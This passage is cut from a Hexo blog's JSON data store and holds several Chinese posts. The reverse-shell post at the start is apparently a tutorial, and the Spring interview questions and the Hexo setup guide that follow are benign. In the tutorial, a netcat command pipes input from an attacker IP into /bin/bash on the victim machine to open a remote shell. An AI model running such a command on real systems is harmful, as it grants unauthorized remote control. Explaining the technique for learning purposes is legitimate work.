参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。</p>\n<p>首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg\">\n<p>然后在受害机器上执行命令<code>nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778</code>，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg\">\n<p>这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg\">\n<p><br></p>\n<p>当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Spring面试题","date":"2018-11-02T03:19:05.000Z","_content":"\n#### 1、consul的可靠性\n\n#### 2、spring的原理，AOP/IOC原理，使用场景\n\n#### 3、spring bean生命周期\n\n#### 4、什么是依赖注入\nDI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。\n\n#### 5、Spring在SSM中起什么作用\n- spring： 是一个轻量级框架\n- 作用： Bean工厂，用来管理Bean的声明周期和框架集成\n- 两大核心： \n\t- IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory\n\t- AOP：面向切面编程\n\n#### 6、Spring的事务\n- 编程式事务： 编程方式管理事务，灵活，但难管理\n- 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务\n\n#### 7、IOC在项目中的作用\nIOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。\n\n#### 8、Spring DI的注入方式\n- 构造注入\n- set注入\n- 接口注入\n\n#### 9、IOC、AOP实现原理\n- IOC：通过反射机制生成对象进行注入\n- AOP：通过动态代理\n\n#### 10、Spring MVC的架构/工作流程图\n{% asset_img springmvc流程图.jpg %}\n\n#### 11、spring bean的作用域和生命周期\n\n#### 12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\n\n#### 13、如何自定义一个spirng boot starter\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Spring面试题.md","raw":"---\ntitle: Spring面试题\ndate: 2018-11-02 11:19:05\ntags:\ncategories:\n---\n\n#### 1、consul的可靠性\n\n#### 2、spring的原理，AOP/IOC原理，使用场景\n\n#### 3、spring bean生命周期\n\n#### 4、什么是依赖注入\nDI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。\n\n#### 5、Spring在SSM中起什么作用\n- spring： 是一个轻量级框架\n- 作用： Bean工厂，用来管理Bean的声明周期和框架集成\n- 两大核心： \n\t- IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory\n\t- AOP：面向切面编程\n\n#### 6、Spring的事务\n- 编程式事务： 编程方式管理事务，灵活，但难管理\n- 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务\n\n#### 7、IOC在项目中的作用\nIOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。\n\n#### 8、Spring DI的注入方式\n- 构造注入\n- set注入\n- 接口注入\n\n#### 9、IOC、AOP实现原理\n- IOC：通过反射机制生成对象进行注入\n- AOP：通过动态代理\n\n#### 10、Spring MVC的架构/工作流程图\n{% asset_img springmvc流程图.jpg %}\n\n#### 11、spring bean的作用域和生命周期\n\n#### 12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\n\n#### 13、如何自定义一个spirng boot starter\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Spring面试题","published":1,"updated":"2018-12-03T09:55:58.126Z","_id":"cjpdmuzzk00084cv0v34lluqb","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1、consul的可靠性\"><a href=\"#1、consul的可靠性\" class=\"headerlink\" title=\"1、consul的可靠性\"></a>1、consul的可靠性</h4><h4 id=\"2、spring的原理，AOP-IOC原理，使用场景\"><a href=\"#2、spring的原理，AOP-IOC原理，使用场景\" class=\"headerlink\" title=\"2、spring的原理，AOP/IOC原理，使用场景\"></a>2、spring的原理，AOP/IOC原理，使用场景</h4><h4 id=\"3、spring-bean生命周期\"><a href=\"#3、spring-bean生命周期\" class=\"headerlink\" title=\"3、spring bean生命周期\"></a>3、spring bean生命周期</h4><h4 id=\"4、什么是依赖注入\"><a href=\"#4、什么是依赖注入\" class=\"headerlink\" title=\"4、什么是依赖注入\"></a>4、什么是依赖注入</h4><p>DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。</p>\n<h4 id=\"5、Spring在SSM中起什么作用\"><a href=\"#5、Spring在SSM中起什么作用\" class=\"headerlink\" title=\"5、Spring在SSM中起什么作用\"></a>5、Spring在SSM中起什么作用</h4><ul>\n<li>spring： 是一个轻量级框架</li>\n<li>作用： Bean工厂，用来管理Bean的声明周期和框架集成</li>\n<li>两大核心： <ul>\n<li>IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory</li>\n<li>AOP：面向切面编程</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、Spring的事务\"><a href=\"#6、Spring的事务\" class=\"headerlink\" title=\"6、Spring的事务\"></a>6、Spring的事务</h4><ul>\n<li>编程式事务： 编程方式管理事务，灵活，但难管理</li>\n<li>声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务</li>\n</ul>\n<h4 id=\"7、IOC在项目中的作用\"><a href=\"#7、IOC在项目中的作用\" class=\"headerlink\" title=\"7、IOC在项目中的作用\"></a>7、IOC在项目中的作用</h4><p>IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。</p>\n<h4 id=\"8、Spring-DI的注入方式\"><a href=\"#8、Spring-DI的注入方式\" class=\"headerlink\" title=\"8、Spring DI的注入方式\"></a>8、Spring DI的注入方式</h4><ul>\n<li>构造注入</li>\n<li>set注入</li>\n<li>接口注入</li>\n</ul>\n<h4 id=\"9、IOC、AOP实现原理\"><a href=\"#9、IOC、AOP实现原理\" class=\"headerlink\" title=\"9、IOC、AOP实现原理\"></a>9、IOC、AOP实现原理</h4><ul>\n<li>IOC：通过反射机制生成对象进行注入</li>\n<li>AOP：通过动态代理</li>\n</ul>\n<h4 id=\"10、Spring-MVC的架构-工作流程图\"><a href=\"#10、Spring-MVC的架构-工作流程图\" class=\"headerlink\" title=\"10、Spring MVC的架构/工作流程图\"></a>10、Spring MVC的架构/工作流程图</h4><img src=\"/posts/2018-11-02-Spring面试题/springmvc流程图.jpg\">\n<h4 id=\"11、spring-bean的作用域和生命周期\"><a href=\"#11、spring-bean的作用域和生命周期\" class=\"headerlink\" title=\"11、spring bean的作用域和生命周期\"></a>11、spring bean的作用域和生命周期</h4><h4 id=\"12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"><a href=\"#12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\" class=\"headerlink\" title=\"12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"></a>12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？</h4><h4 id=\"13、如何自定义一个spirng-boot-starter\"><a href=\"#13、如何自定义一个spirng-boot-starter\" class=\"headerlink\" title=\"13、如何自定义一个spirng boot starter\"></a>13、如何自定义一个spirng boot starter</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、consul的可靠性\"><a href=\"#1、consul的可靠性\" class=\"headerlink\" title=\"1、consul的可靠性\"></a>1、consul的可靠性</h4><h4 id=\"2、spring的原理，AOP-IOC原理，使用场景\"><a href=\"#2、spring的原理，AOP-IOC原理，使用场景\" class=\"headerlink\" title=\"2、spring的原理，AOP/IOC原理，使用场景\"></a>2、spring的原理，AOP/IOC原理，使用场景</h4><h4 id=\"3、spring-bean生命周期\"><a href=\"#3、spring-bean生命周期\" class=\"headerlink\" title=\"3、spring bean生命周期\"></a>3、spring bean生命周期</h4><h4 id=\"4、什么是依赖注入\"><a href=\"#4、什么是依赖注入\" class=\"headerlink\" title=\"4、什么是依赖注入\"></a>4、什么是依赖注入</h4><p>DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。</p>\n<h4 id=\"5、Spring在SSM中起什么作用\"><a href=\"#5、Spring在SSM中起什么作用\" class=\"headerlink\" title=\"5、Spring在SSM中起什么作用\"></a>5、Spring在SSM中起什么作用</h4><ul>\n<li>spring： 是一个轻量级框架</li>\n<li>作用： Bean工厂，用来管理Bean的声明周期和框架集成</li>\n<li>两大核心： <ul>\n<li>IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory</li>\n<li>AOP：面向切面编程</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、Spring的事务\"><a href=\"#6、Spring的事务\" class=\"headerlink\" title=\"6、Spring的事务\"></a>6、Spring的事务</h4><ul>\n<li>编程式事务： 编程方式管理事务，灵活，但难管理</li>\n<li>声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务</li>\n</ul>\n<h4 id=\"7、IOC在项目中的作用\"><a href=\"#7、IOC在项目中的作用\" class=\"headerlink\" title=\"7、IOC在项目中的作用\"></a>7、IOC在项目中的作用</h4><p>IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。</p>\n<h4 id=\"8、Spring-DI的注入方式\"><a href=\"#8、Spring-DI的注入方式\" class=\"headerlink\" title=\"8、Spring DI的注入方式\"></a>8、Spring DI的注入方式</h4><ul>\n<li>构造注入</li>\n<li>set注入</li>\n<li>接口注入</li>\n</ul>\n<h4 id=\"9、IOC、AOP实现原理\"><a href=\"#9、IOC、AOP实现原理\" class=\"headerlink\" title=\"9、IOC、AOP实现原理\"></a>9、IOC、AOP实现原理</h4><ul>\n<li>IOC：通过反射机制生成对象进行注入</li>\n<li>AOP：通过动态代理</li>\n</ul>\n<h4 id=\"10、Spring-MVC的架构-工作流程图\"><a href=\"#10、Spring-MVC的架构-工作流程图\" class=\"headerlink\" title=\"10、Spring MVC的架构/工作流程图\"></a>10、Spring MVC的架构/工作流程图</h4><img src=\"/posts/2018-11-02-Spring面试题/springmvc流程图.jpg\">\n<h4 id=\"11、spring-bean的作用域和生命周期\"><a href=\"#11、spring-bean的作用域和生命周期\" class=\"headerlink\" title=\"11、spring bean的作用域和生命周期\"></a>11、spring bean的作用域和生命周期</h4><h4 id=\"12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"><a href=\"#12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\" class=\"headerlink\" title=\"12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"></a>12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？</h4><h4 id=\"13、如何自定义一个spirng-boot-starter\"><a href=\"#13、如何自定义一个spirng-boot-starter\" class=\"headerlink\" title=\"13、如何自定义一个spirng boot starter\"></a>13、如何自定义一个spirng boot starter</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"微服务面试题","date":"2018-11-02T03:26:34.000Z","_content":"\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/微服务面试题.md","raw":"---\ntitle: 微服务面试题\ndate: 2018-11-02 11:26:34\ntags:\ncategories:\n---\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"微服务面试题","published":1,"updated":"2018-11-29T09:59:50.697Z","_id":"cjpdmuzzo000a4cv03czeog6b","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"hexo-安装及配置","date":"2018-09-07T10:39:40.000Z","_content":"\n## 前言\n曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。\n\n## 一、预备\n  \n**1、安装Nodejs及npm**\n\nNodejs下载地址： [官网下载地址：https://nodejs.org/zh-cn/download/](https://nodejs.org/zh-cn/download/)\n\n**2、安装Git**\n\nGit下载地址： [官网下载地址：https://git-scm.com/download/](https://git-scm.com/download/)\n\n安装完成后，执行如下命令，可以显示版本号就算安装成功了  \n\n```shell\n$ node -v\nv9.11.1\n\n$ npm -v\n6.3.0\n\n$ git --version\ngit version 2.17.0.windows.1\n```\n\n## 二、安装hexo \n\n进入命令行，执行如下命令:  \n\n```shell\n1、全局安装hexo\n$ npm install hexo -g\n\n2、创建hexo工作目录\n$ mkdir hexo-blog\n$ cd hexo-blog\n\n3、初始化工作目录\n$ hexo init\n\n4、本地启动hexo\n$ hexo serve\n```\n  \n到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。\n\n<br>\n\n当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。\n\n## 三、hexo配置\n\nhexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照[hexo官网文档](https://hexo.io/zh-cn/docs/configuration.html)进行配置，当然，有兴趣可以参照[我的配置](https://github.com/AriesRen/ariesren.github.io)\n\n\n网站配置：\n```yml\n# Site\ntitle: Aries' blog 网站标题\nsubtitle: 副标题\ndescription: 我不生产知识，我只是知识的搬运工。 网站一句话描述\nkeywords: 关键词\nauthor: 无名万物 作者\nlanguage: zh-CN 语言\ntimezone: Asia/Shanghai 时区\n```\n\n文章配置： \n```yml\nurl: http://blog.renhj.org  网站url\nroot: /   文章根路径\npermalink: posts/:year-:month-:day-:title.html  文章url\npermalink_defaults:\n```\n\n## 四、创建新文章\n\n你可以通过以下命令来创建一篇新文章\n```shell\nhexo new [layout] <title>\n```\n\n命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.\n\n\n当然也可以新建一个草稿： draft，这种布局在建立时会保存到`source/_drafts`文件夹，也可以通过`publish`来将草稿移动到正式文件夹。\n\n```shell\n# 新建草稿文章\n$ hexo new draft <title>\n\n# 将文章正式发布\n$ hexo publish [layout] <title>\n```\n\n**Front-matter**\n\nFront-matter是文章最上方以`---` 分割的区域，用于指定个别文件的变量\n\n```\n---\nlayout: 指定文章的布局属性\ntitle： 文章标题\ndata：建立日期\nupdated： 更新日期\ncomments： 是否开启文章的评论功能(如果有的话)\ntags： 标签\ncategories：分类\npermalink： 覆盖文章的网址\n---\n```\n\n\n##  修改美化\n\n\n默认的主题是有点丑，可以去[hexo的主题商店](https://hexo.io/themes/) 找一个自己喜欢的、漂亮的主题。\n\n本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：[hexo nexT主题](http://theme-next.iissnan.com/)，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/hexo-安装及配置.md","raw":"---\ntitle: hexo-安装及配置\ndate: 2018-09-07 18:39:40\ntags: ['hexo','博客', 'nexT','Github Pages']\ncategories: hexo\n---\n\n## 前言\n曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。\n\n## 一、预备\n  \n**1、安装Nodejs及npm**\n\nNodejs下载地址： [官网下载地址：https://nodejs.org/zh-cn/download/](https://nodejs.org/zh-cn/download/)\n\n**2、安装Git**\n\nGit下载地址： [官网下载地址：https://git-scm.com/download/](https://git-scm.com/download/)\n\n安装完成后，执行如下命令，可以显示版本号就算安装成功了  \n\n```shell\n$ node -v\nv9.11.1\n\n$ npm -v\n6.3.0\n\n$ git --version\ngit version 2.17.0.windows.1\n```\n\n## 二、安装hexo \n\n进入命令行，执行如下命令:  \n\n```shell\n1、全局安装hexo\n$ npm install hexo -g\n\n2、创建hexo工作目录\n$ mkdir hexo-blog\n$ cd hexo-blog\n\n3、初始化工作目录\n$ hexo init\n\n4、本地启动hexo\n$ hexo serve\n```\n  \n到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。\n\n<br>\n\n当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。\n\n## 三、hexo配置\n\nhexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照[hexo官网文档](https://hexo.io/zh-cn/docs/configuration.html)进行配置，当然，有兴趣可以参照[我的配置](https://github.com/AriesRen/ariesren.github.io)\n\n\n网站配置：\n```yml\n# Site\ntitle: Aries' blog 网站标题\nsubtitle: 副标题\ndescription: 我不生产知识，我只是知识的搬运工。 网站一句话描述\nkeywords: 关键词\nauthor: 无名万物 作者\nlanguage: zh-CN 语言\ntimezone: Asia/Shanghai 时区\n```\n\n文章配置： \n```yml\nurl: http://blog.renhj.org  网站url\nroot: /   文章根路径\npermalink: posts/:year-:month-:day-:title.html  文章url\npermalink_defaults:\n```\n\n## 四、创建新文章\n\n你可以通过以下命令来创建一篇新文章\n```shell\nhexo new [layout] <title>\n```\n\n命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.\n\n\n当然也可以新建一个草稿： draft，这种布局在建立时会保存到`source/_drafts`文件夹，也可以通过`publish`来将草稿移动到正式文件夹。\n\n```shell\n# 新建草稿文章\n$ hexo new draft <title>\n\n# 将文章正式发布\n$ hexo publish [layout] <title>\n```\n\n**Front-matter**\n\nFront-matter是文章最上方以`---` 分割的区域，用于指定个别文件的变量\n\n```\n---\nlayout: 指定文章的布局属性\ntitle： 文章标题\ndata：建立日期\nupdated： 更新日期\ncomments： 是否开启文章的评论功能(如果有的话)\ntags： 标签\ncategories：分类\npermalink： 覆盖文章的网址\n---\n```\n\n\n##  修改美化\n\n\n默认的主题是有点丑，可以去[hexo的主题商店](https://hexo.io/themes/) 找一个自己喜欢的、漂亮的主题。\n\n本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：[hexo nexT主题](http://theme-next.iissnan.com/)，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"hexo-安装及配置","published":1,"updated":"2018-11-29T09:59:50.682Z","_id":"cjpdmuzzw000e4cv0s2mj1ju1","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。</p>\n<h2 id=\"一、预备\"><a href=\"#一、预备\" class=\"headerlink\" title=\"一、预备\"></a>一、预备</h2><p><strong>1、安装Nodejs及npm</strong></p>\n<p>Nodejs下载地址： <a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://nodejs.org/zh-cn/download/</a></p>\n<p><strong>2、安装Git</strong></p>\n<p>Git下载地址： <a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://git-scm.com/download/</a></p>\n<p>安装完成后，执行如下命令，可以显示版本号就算安装成功了  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span> node -v</span><br><span class=\"line\">v9.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span> npm -v</span><br><span class=\"line\">6.3.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span> git --version</span><br><span class=\"line\">git version 2.17.0.windows.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>进入命令行，执行如下命令:  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、全局安装hexo</span><br><span class=\"line\"><span class=\"meta\">$</span> npm install hexo -g</span><br><span class=\"line\"></span><br><span class=\"line\">2、创建hexo工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span> mkdir hexo-blog</span><br><span class=\"line\"><span class=\"meta\">$</span> cd hexo-blog</span><br><span class=\"line\"></span><br><span class=\"line\">3、初始化工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo init</span><br><span class=\"line\"></span><br><span class=\"line\">4、本地启动hexo</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo serve</span><br></pre></td></tr></table></figure>\n<p>到此一个hexo博客已经搭建完成了，可以访问 <a href=\"http://localhost:4000/\" target=\"_blank\" rel=\"noopener\">http://localhost:4000/</a> 查看博客的效果。</p>\n<p><br></p>\n<p>当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。</p>\n<h2 id=\"三、hexo配置\"><a href=\"#三、hexo配置\" class=\"headerlink\" title=\"三、hexo配置\"></a>三、hexo配置</h2><p>hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">hexo官网文档</a>进行配置，当然，有兴趣可以参照<a href=\"https://github.com/AriesRen/ariesren.github.io\" target=\"_blank\" rel=\"noopener\">我的配置</a></p>\n<p>网站配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\"><span class=\"attr\">title:</span> <span class=\"string\">Aries'</span> <span class=\"string\">blog</span> <span class=\"string\">网站标题</span></span><br><span class=\"line\"><span class=\"attr\">subtitle:</span> <span class=\"string\">副标题</span></span><br><span class=\"line\"><span class=\"attr\">description:</span> <span class=\"string\">我不生产知识，我只是知识的搬运工。</span> <span class=\"string\">网站一句话描述</span></span><br><span class=\"line\"><span class=\"attr\">keywords:</span> <span class=\"string\">关键词</span></span><br><span class=\"line\"><span class=\"attr\">author:</span> <span class=\"string\">无名万物</span> <span class=\"string\">作者</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">zh-CN</span> <span class=\"string\">语言</span></span><br><span class=\"line\"><span class=\"attr\">timezone:</span> <span class=\"string\">Asia/Shanghai</span> <span class=\"string\">时区</span></span><br></pre></td></tr></table></figure></p>\n<p>文章配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">url:</span> <span class=\"attr\">http://blog.renhj.org</span>  <span class=\"string\">网站url</span></span><br><span class=\"line\"><span class=\"attr\">root:</span> <span class=\"string\">/</span>   <span class=\"string\">文章根路径</span></span><br><span class=\"line\"><span class=\"attr\">permalink:</span> <span class=\"string\">posts/:year-:month-:day-:title.html</span>  <span class=\"string\">文章url</span></span><br><span class=\"line\"><span class=\"attr\">permalink_defaults:</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四、创建新文章\"><a href=\"#四、创建新文章\" class=\"headerlink\" title=\"四、创建新文章\"></a>四、创建新文章</h2><p>你可以通过以下命令来创建一篇新文章<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new [layout] 